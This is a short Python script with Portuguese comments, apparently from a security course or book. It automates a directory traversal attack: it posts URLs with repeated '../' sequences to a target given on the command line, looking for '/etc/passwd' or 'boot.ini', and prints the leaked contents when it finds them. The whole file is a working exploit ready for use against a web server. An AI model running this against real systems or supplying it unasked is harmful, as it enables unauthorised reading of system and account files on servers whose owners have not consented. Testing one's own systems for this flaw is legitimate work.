#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo faz 
  tentaiva de ataque ao
  Referência de objeto direto

  Modificado em 28 de fevereiro de 2017
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importando as bibliotecas necessárias.
import requests
import sys


url = sys.argv[1] # Argumento 1
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'} # root para linux e boot.ini para Windows Server

up = "../"
i = 0

# Interação 
for payload, string in payloads.iteritems():
	while i < 7:
		req = requests.post(url+(i*up)+payload)
		if string in req.text:
			print ("Parâmetro vulnerável\r\n")
			print ("Atacando com a string: "+(i*up)+payload+"\r\n")
			print (req.text)
			break
		else:
			print ("Não é vulnerável")
		i = i+1
	i = 0





